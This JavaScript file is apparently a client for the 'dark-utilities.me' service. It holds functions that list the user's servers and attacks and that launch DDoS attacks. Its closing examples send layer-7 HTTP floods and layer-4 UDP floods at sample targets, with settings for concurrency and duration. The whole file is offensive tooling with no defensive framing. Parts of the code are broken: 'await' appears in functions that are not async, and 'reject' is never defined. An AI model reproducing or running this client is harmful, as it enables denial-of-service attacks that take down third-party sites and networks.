
var phin = require('phin');

/* Configuration */
var hostname = "dark-utilities.me";
var apikey = "";
var header = {
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',
    'Authorization': apikey,
};

const darkutilities = {

    StatusApi: function () {
        var res = await phin({
            method: "GET",
            url: 'https://' + hostname + '/api/v1/@me',
            parse: 'json',
            headers: header,
         });
        
        return res.statusCode
    },

    getUserInfo: function () {
        var res = await phin({
            method: "GET",
            url: 'https://' + hostname + '/api/v1/@me',
            parse: 'json',
            headers: header,
         });
         
        return res.body
    },
    getServerList: function () {
        var res = await phin({
            method: "GET",
            url: 'https://' + hostname + '/api/v1/manager',
            parse: 'json',
            headers: header,
         });
         
        return res.body
    },
    getServerInfo: function (server_digest) {
        if (server_digest == '') return reject('Server digest is empty');
        var res = await phin({
            method: "GET",
            url: 'https://' + hostname + '/api/v1/servers/' + server_digest,
            parse: 'json',
            headers: header,
         });
         
        return res.body
    },
    sendAttack: function (action, data, selection) {
        if (action == '') return reject('Action is empty');
        if (data == '') return reject('Data is empty');
            
        var res = await phin({
            method: "GET",
            url: 'https://' + hostname + '/api/v1/manager',
            parse: 'json',
            headers: header,
            data: {
                    action: action,
                    data: data,
                    selection: selection,
            }
         });
         
        return res.body
    },
    getAttacks: function () {
        var res = await phin({
            method: "GET",
            url: 'https://' + hostname + '/api/v1/manager/attacks',
            parse: 'json',
            headers: header,
         });
         
        return res.body
    }
}

// Return Status Code Api Key
darkutilities.StatusApi().then(info => {
    console.log(info);
});

// Return dict with account infos
darkutilities.getUserInfo().then(info => {
    console.log(info);
});

// Return dict with servers list
darkutilities.getServerList().then(server => {
    console.log(server);
});

// Return dict with server infos
darkutilities.getServerInfo('fd06d2f5192fd94341543d15ae8158bb').then(server => {
    console.log(server);
});

// Send attack ddos-layer7
darkutilities.sendAttack('ddos-layer7', {
    'method': 'GET',
    'target': 'https://exemple.com/hit',
    'concurrents': 100,
    'time': 20
}, [
    { "server_id": "fd06d2f5192fd94341543d15ae8158bb", 'server_selected': true },
]).then(attack => {
    console.log(attack);
});

// Send attacks ddos-layer4
darkutilities.sendAttack('ddos-layer4', {
    'method': 'UDP',
    'target': '1.1.1.1',
    'port': 80,
    'concurrents': 10,
    'time': 20
}).then(attack => {
    console.log(attack);
});

// Get attacks list
darkutilities.getAttacks().then(attacks => {
    console.log(attacks);
});
